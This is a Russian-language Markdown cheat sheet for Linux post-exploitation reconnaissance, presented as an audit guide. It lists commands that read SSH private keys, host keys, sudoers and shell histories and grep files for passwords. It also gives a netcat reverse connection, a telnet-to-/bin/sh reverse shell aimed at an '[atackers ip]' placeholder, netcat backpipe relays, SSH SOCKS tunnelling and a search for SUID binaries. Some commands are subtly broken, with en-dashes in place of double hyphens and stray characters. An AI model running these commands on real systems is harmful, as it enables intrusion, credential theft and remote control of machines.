# Cheat sheet to audit Linux

## OS

### Определение версии и типа дистрибутива

```
cat /etc/issue
cat /etc/*-release
lsb_release -a
cat /etc/lsb-release         # Debian based
cat /etc/redhat-release      # Redhat based
```

### Определение версии ядра и разрядности системы

```
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

### Информация о переменных окружения

```
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

## Apps and services

### Список запущенных сервисов 

```
ps aux                           
ps -ef                      
top                         #htop
cat /etc/services
```

### Поиск установленных приложений, их версий и их активности на данный момент

```
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```

### Просмотр конфигурационных файлов

```
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```

### Поиск и просмотр запланированных задач (cron)

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### Поиск логинов и паролей в файлах и по именам пользователей

```
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
find / -user [user]
```

## Network

### Обозначение сетевых интерфейсов в системе, проверка подключений к сетям

```
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
```

### Определение конфигураций сетевых адаптеров, а так же DHCP, DNS, и шлюзов

```
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
```

### Проверка водящих подключений к системе. Пользователи и хосты

```
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
```

### Проверка кэша, и сохраненных IP/MAC адресов

```
arp -e
route
/sbin/route –nee
```

### Проверка возможности сниффинга трафика

```
tcpdump net 192.168.0.1/32
```

### Проверка возможности открытия обратных подключений (TCP)

```
nc -lvp 4444    # На стороне атакуемой системы
nc 192.168.0.101 4444 # Атакующая сторона

telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # Выполняется на атакующей системе
```

### Определение возможности проброса портов. Перенаправление и взаимодействие с трафиком с другого вида.

```
vi /etc/rinetd.conf
netstat –tap
ssh -L 8080:127.0.0.1:80 root@192.168.0.101    # Локальный порт
ssh -R 8080:127.0.0.1:80 root@192.168.0.101    # Удаленный порт

mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Ретрансляция портов
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Прокси (Port 80 to 8080)
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Мониторинг прокси (Port 80 to 8080)
```

### Определение возможностей туннелирования, удаленные и локальные команды

```
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig
```

## Confidential information and users

### Идентификация себя в системе, авторизированные пользователи, список последних авторизированных пользователей, пользователи, находящиеся в системе, последние их действия.

```
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo –l
```

### Анализ последних действий пользователя, поиск текстовых паролей, обнаружение следов редактирования:

```
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

### Поиск информации о приватных ключах

```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

### Поиск "Advanced Linux File Permissions" Sticky bits, SUID & GUID

```
find / -perm -1000 -type d 2>/dev/null   # Sticky bit – Только для владельца каталога
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - запускается как группа, а не пользователь, который ее запустил.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - запускается как владелец, а не пользователь, который его запустил.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Поиск в местах по умолчанию -  /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin и других *bin, для SGID or SUID (Быстрый поиск)
```

### Поиск в корневом каталоге (/), SGID or SUID, без символьных ссылок, только для первых трех каталогов, вывод подробной информации и игнорирование ошибок (например - permission denied)

```
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```

### Поиск директорий, в которых можно записывать и запускать файлы. В общих директориях: /tmp, /var/tmp, /dev/shm

```
find / -writable -type d 2>/dev/null      # общедоступные папки
find / -perm -222 -type d 2>/dev/null     # общедоступные папки
find / -perm -o w -type d 2>/dev/null     # общедоступные папки
find / -perm -o x -type d 2>/dev/null     # общедоступные папки
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # общедоступные папки & исполняемые папки
```

### Языки программирования и компиляторы

```
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
python –version
ruby –version
gcc --version
```

### Поиск возможности загрузки файлов на сервер

```
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
wget –version
nc -v
```
